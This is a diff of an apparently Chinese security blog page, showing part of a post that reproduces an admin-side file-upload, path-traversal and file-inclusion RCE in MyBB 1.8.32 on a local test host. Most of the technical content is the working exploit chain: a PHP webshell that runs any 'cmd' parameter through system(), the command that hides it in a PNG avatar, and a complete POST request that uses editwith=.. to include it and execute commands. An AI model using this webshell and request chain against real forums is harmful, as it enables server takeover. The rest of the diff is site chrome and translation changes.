-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybb1832.cn/admin/index.php?module=config-settings&amp;action=change</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="aHR0cDovL3d3dy5teWJiMTgzMi5jbi9hZG1pbi9pbmRleC5waHA/bW9kdWxlPWNvbmZpZy1zZXR0aW5ncyZhY3Rpb249Y2hhbmdlCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybb1832.cn/admin/index.php?module=config-settings&amp;action=change</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb21.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb21.png"></li>
 </ul>
 <p>后面上传的头像文件，就可以上传到&#x2F;inc目录下，来到头像上传处，选择大小小于1kb的头像，然后点击”save user”，就可以将包含php木马的图片上传到&#x2F;inc目录下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybb1832.cn/admin/index.php?module=user-users&amp;action=edit&amp;uid=1<span class="comment">#tab_avatar</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="aHR0cDovL3d3dy5teWJiMTgzMi5jbi9hZG1pbi9pbmRleC5waHA/bW9kdWxlPXVzZXItdXNlcnMmYWN0aW9uPWVkaXQmdWlkPTEjdGFiX2F2YXRhcgo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybb1832.cn/admin/index.php?module=user-users&amp;action=edit&amp;uid=1<span class="comment">#tab_avatar</span></span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb22.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb22.png"></li>
 </ul>
 <p>因为网站会进行压缩，将php脚本破坏，现在制作php图片木马：</p>
 <p>将包含如下木马内容的php文件和正常png图片文件合并</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;getshell success!&quot;</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="built_in">echo</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="PD9waHAKaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICAgICAgIGVjaG8gImdldHNoZWxsIHN1Y2Nlc3MhIjsKICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICAgICAgIGVjaG8gc3lzdGVtKCRjbWQpOwogICAgICAgIHBocGluZm8oKTsKfQo/Pgo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;getshell success!&quot;</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="built_in">echo</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy close.png/b + shell.php/a shell.png</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="Y29weSBjbG9zZS5wbmcvYiArIHNoZWxsLnBocC9hIHNoZWxsLnBuZwo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy close.png/b + shell.php/a shell.png</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb23.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb23.png"></li>
 </ul>
 <p>制作成功，现在上传该文件，并右键复制图像链接，可以看到它在服务器上的文件名为avatar_1.png</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybb1832.cn/inc/avatar_1.png?dateline=1674025701</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="aHR0cDovL3d3dy5teWJiMTgzMi5jbi9pbmMvYXZhdGFyXzEucG5nP2RhdGVsaW5lPTE2NzQwMjU3MDEK"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybb1832.cn/inc/avatar_1.png?dateline=1674025701</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb24.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb24.png"></li>
 </ul>
 <h2 id="路径穿越文件包含实现RCE"><a href="#路径穿越文件包含实现RCE" class="headerlink" title="路径穿越文件包含实现RCE"></a>路径穿越文件包含实现RCE</h2><p>现在来进行文件包含之前的图片马，来到：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybb1832.cn/admin/index.php?module=config-languages&amp;action=edit&amp;lang=english&amp;editwith=&amp;file=announcements.lang.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="aHR0cDovL3d3dy5teWJiMTgzMi5jbi9hZG1pbi9pbmRleC5waHA/bW9kdWxlPWNvbmZpZy1sYW5ndWFnZXMmYWN0aW9uPWVkaXQmbGFuZz1lbmdsaXNoJmVkaXR3aXRoPSZmaWxlPWFubm91bmNlbWVudHMubGFuZy5waHAK"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybb1832.cn/admin/index.php?module=config-languages&amp;action=edit&amp;lang=english&amp;editwith=&amp;file=announcements.lang.php</span><br></pre></td></tr></table></figure>
 
 <p>不用修改任何内容直接点save language file然后抓包发送到repeater:</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb25.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb25.png"></li>
 </ul>
 <p>在repeater中修改file参数值为avatar_1.png，editwith参数值为”..”，即可实现一层路径穿越到&#x2F;inc目录文件包含avatar_1.png中的php木马，RCE成功</p>
 <p>RCE请求包：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/index.php?module=config-languages&amp;action=edit&amp;cmd=<span class="built_in">id</span> HTTP/1.1</span><br><span class="line">Host: www.mybb1832.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 518</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: acploginattempts=0; adminsid=902f49bd1bc1979a9e74d21017afc07c; mybb[lastvisit]=1673917082; mybb[lastactive]=1673917144; sid=3f11a37cfe7a2ad7d6b107c4e2d90168; loginattempts=1; mybbuser=1_9kiPJrzlrCosZesW7Zu3C5drhIa7mKVzJpq6vOAdULRPatNNdw</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">my_post_key=7f8f8bf788db537641f6607860aa462a&amp;file=avatar_1.png&amp;lang=english&amp;editwith=..&amp;inadmin=0&amp;edit%5Bnav_announcements%5D=Forum+Announcement&amp;edit%5Bannouncements%5D=Announcement&amp;edit%5Bforum_announcement%5D=Forum+Announcement%3A+%7B1%7D&amp;edit%5Berror_invalidannouncement%5D=The+announcement+specified+is+invalid.&amp;edit%5Bannouncement_edit%5D=Edit+this+announcement&amp;edit%5Bannouncement_qdelete%5D=Delete+this+announcement&amp;edit%5Bannouncement_quickdelete_confirm%5D=Are+you+sure+you+want+to+delete+this+announcement%3F</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="UE9TVCAvYWRtaW4vaW5kZXgucGhwP21vZHVsZT1jb25maWctbGFuZ3VhZ2VzJmFjdGlvbj1lZGl0JmNtZD1pZCBIVFRQLzEuMQpIb3N0OiB3d3cubXliYjE4MzIuY24KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjAKQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44CkFjY2VwdC1MYW5ndWFnZTogemgtQ04semg7cT0wLjgsemgtVFc7cT0wLjcsemgtSEs7cT0wLjUsZW4tVVM7cT0wLjMsZW47cT0wLjIKQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbnRlbnQtTGVuZ3RoOiA1MTgKT3JpZ2luOiBudWxsCkNvbm5lY3Rpb246IGNsb3NlCkNvb2tpZTogYWNwbG9naW5hdHRlbXB0cz0wOyBhZG1pbnNpZD05MDJmNDliZDFiYzE5NzlhOWU3NGQyMTAxN2FmYzA3YzsgbXliYltsYXN0dmlzaXRdPTE2NzM5MTcwODI7IG15YmJbbGFzdGFjdGl2ZV09MTY3MzkxNzE0NDsgc2lkPTNmMTFhMzdjZmU3YTJhZDdkNmIxMDdjNGUyZDkwMTY4OyBsb2dpbmF0dGVtcHRzPTE7IG15YmJ1c2VyPTFfOWtpUEpyemxyQ29zWmVzVzdadTNDNWRyaElhN21LVnpKcHE2dk9BZFVMUlBhdE5OZHcKVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQoKbXlfcG9zdF9rZXk9N2Y4ZjhiZjc4OGRiNTM3NjQxZjY2MDc4NjBhYTQ2MmEmZmlsZT1hdmF0YXJfMS5wbmcmbGFuZz1lbmdsaXNoJmVkaXR3aXRoPS4uJmluYWRtaW49MCZlZGl0JTVCbmF2X2Fubm91bmNlbWVudHMlNUQ9Rm9ydW0rQW5ub3VuY2VtZW50JmVkaXQlNUJhbm5vdW5jZW1lbnRzJTVEPUFubm91bmNlbWVudCZlZGl0JTVCZm9ydW1fYW5ub3VuY2VtZW50JTVEPUZvcnVtK0Fubm91bmNlbWVudCUzQSslN0IxJTdEJmVkaXQlNUJlcnJvcl9pbnZhbGlkYW5ub3VuY2VtZW50JTVEPVRoZSthbm5vdW5jZW1lbnQrc3BlY2lmaWVkK2lzK2ludmFsaWQuJmVkaXQlNUJhbm5vdW5jZW1lbnRfZWRpdCU1RD1FZGl0K3RoaXMrYW5ub3VuY2VtZW50JmVkaXQlNUJhbm5vdW5jZW1lbnRfcWRlbGV0ZSU1RD1EZWxldGUrdGhpcythbm5vdW5jZW1lbnQmZWRpdCU1QmFubm91bmNlbWVudF9xdWlja2RlbGV0ZV9jb25maXJtJTVEPUFyZSt5b3Urc3VyZSt5b3Urd2FudCt0bytkZWxldGUrdGhpcythbm5vdW5jZW1lbnQlM0YK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/index.php?module=config-languages&amp;action=edit&amp;cmd=<span class="built_in">id</span> HTTP/1.1</span><br><span class="line">Host: www.mybb1832.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 518</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: acploginattempts=0; adminsid=902f49bd1bc1979a9e74d21017afc07c; mybb[lastvisit]=1673917082; mybb[lastactive]=1673917144; sid=3f11a37cfe7a2ad7d6b107c4e2d90168; loginattempts=1; mybbuser=1_9kiPJrzlrCosZesW7Zu3C5drhIa7mKVzJpq6vOAdULRPatNNdw</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">my_post_key=7f8f8bf788db537641f6607860aa462a&amp;file=avatar_1.png&amp;lang=english&amp;editwith=..&amp;inadmin=0&amp;edit%5Bnav_announcements%5D=Forum+Announcement&amp;edit%5Bannouncements%5D=Announcement&amp;edit%5Bforum_announcement%5D=Forum+Announcement%3A+%7B1%7D&amp;edit%5Berror_invalidannouncement%5D=The+announcement+specified+is+invalid.&amp;edit%5Bannouncement_edit%5D=Edit+this+announcement&amp;edit%5Bannouncement_qdelete%5D=Delete+this+announcement&amp;edit%5Bannouncement_quickdelete_confirm%5D=Are+you+sure+you+want+to+delete+this+announcement%3F</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb26.png"></p>
+<li><p><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb26.png"></p>
 </li>
-<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb27.png"></p>
+<li><p><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb27.png"></p>
 </li>
-<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb28.png"></p>
+<li><p><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb28.png"></p>
 </li>
 </ul>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>两个点”..”的一层路径穿越即可绕过上传路径黑名单，这就是代码审计的准确性与魅力所在。</p>
@@ -538,16 +540,16 @@
           <div class="reward-container">
   <div>Buy me a coffee</div>
   <button>
-    Donate
+    赞赏
   </button>
   <div class="post-reward">
       <div>
-        <img src="/images/wechatpay.png" alt="253 WeChat Pay">
-        <span>WeChat Pay</span>
+        <img src="/images/wechatpay.png" alt="253 微信">
+        <span>微信</span>
       </div>
       <div>
-        <img src="/images/alipay.png" alt="253 Alipay">
-        <span>Alipay</span>
+        <img src="/images/alipay.png" alt="253 支付宝">
+        <span>支付宝</span>
       </div>
 
   </div>
@@ -558,20 +560,20 @@
 <div class="post-copyright">
 <ul>
   <li class="post-copyright-author">
-      <strong>Post author:  </strong>253
+      <strong>本文作者： </strong>253
   </li>
   <li class="post-copyright-link">
-      <strong>Post link: </strong>
+      <strong>本文链接：</strong>
       <a href="https://lucifer11.xyz/2023/01/17/mybb1-8-32-LFI-RCE/" title="mybb 1.8.32 代码审计 + LFI RCE 复现">https://lucifer11.xyz/2023/01/17/mybb1-8-32-LFI-RCE/</a>
   </li>
   <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
   </li>
 </ul>
 </div>
 
           <div class="followme">
-  <span>Welcome to my other publishing channels</span>
+  <span>欢迎关注我的其它发布渠道</span>
 
   <div class="social-list">
 
@@ -630,20 +632,23 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="fa fa-tag"></i> 漏洞利用复现</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"><i class="fa fa-tag"></i> 文件上传</a>
+              <a href="/tags/LFI/" rel="tag"><i class="fa fa-tag"></i> LFI</a>
+              <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+              <a href="/tags/MyBB/" rel="tag"><i class="fa fa-tag"></i> MyBB</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/04/10/Perspective/" rel="prev" title="Hack-The-Box-walkthrough[Perspective]">
-                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Perspective]
+                <a href="/2021/09/01/PWN-methodology/" rel="prev" title="PWN-LINUX技巧总结">
+                  <i class="fa fa-chevron-left"></i> PWN-LINUX技巧总结
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/02/07/msf-meterpreter-traffic-decrypt/" rel="next" title="HackTheBox Response [Msf Meterpreter 流量解密] + [破碎ssh key 复原]">
-                  HackTheBox Response [Msf Meterpreter 流量解密] + [破碎ssh key 复原] <i class="fa fa-chevron-right"></i>
+                <a href="/2023/04/08/wordpress-core-sql-CVE-2022%E2%80%9321661/" rel="next" title="WordPress核心框架WP_Query - 带插件SQL注入代码审计复现(CVE-2022–21661)">
+                  WordPress核心框架WP_Query - 带插件SQL注入代码审计复现(CVE-2022–21661) <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
@@ -676,15 +681,15 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-      <span>Word count total: </span>
-    <span title="Word count total">666k</span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">696k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-      <span>Reading time total &asymp;</span>
-    <span title="Reading time total">40:23</span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">42:11</span>
   </span>
 </div>
 <div class="busuanzi-count">
@@ -692,7 +697,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
-      <span class="site-uv" title="Total Visitors">
+      <span class="site-uv" title="总访客量">
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
@@ -700,12 +705,12 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
-      <span class="site-pv" title="Total Views">
+      <span class="site-pv" title="总访问量">
         <span id="busuanzi_value_site_pv"></span>
       </span>
     </span>
 </div>
-  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span> 强力驱动
   </div>
 
     </div>
